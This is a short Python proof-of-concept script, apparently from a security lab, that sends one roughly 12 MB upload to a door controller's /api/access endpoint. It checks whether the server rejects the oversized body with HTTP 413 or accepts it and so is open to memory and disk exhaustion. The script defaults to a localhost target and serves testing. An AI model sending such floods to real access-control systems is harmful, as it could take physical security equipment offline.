"""PoC #4 - no upload size limit (DoS).

There is no MAX_CONTENT_LENGTH, so the whole body is buffered, saved and decoded
regardless of size; large or repeated uploads exhaust memory/disk and can take
the door controller offline. We send one ~12 MB body and show the server accepts
it (no 413). The secured app rejects the same upload with 413.
"""
import os
import sys
from _labclient import post_multipart

BASE = os.environ.get("BASE", "http://127.0.0.1:8080")
URL = BASE + "/api/access"
KEY = os.environ.get("API_KEY", "")
HDRS = {"X-API-Key": KEY} if KEY else None
SIZE_MB = int(os.environ.get("SIZE_MB", "12"))


def main():
    blob = b"A" * (SIZE_MB * 1024 * 1024)
    print(f"[*] POST {URL} with a {SIZE_MB} MB body")
    status, body = post_multipart(URL, "image", "big.jpg", blob, "image/jpeg", headers=HDRS)
    print(f"[*] HTTP {status}")
    if status == 413:
        print("[+] Server REJECTED oversized upload (413) -> size limit enforced.")
    else:
        print("[!] Server did NOT reject the oversized upload (no 413) ->")
        print("    no MAX_CONTENT_LENGTH: vulnerable to resource exhaustion.")
    print("[*] body[:160]:", body[:160].replace("\n", " "))
    return 0


if __name__ == "__main__":
    sys.exit(main())
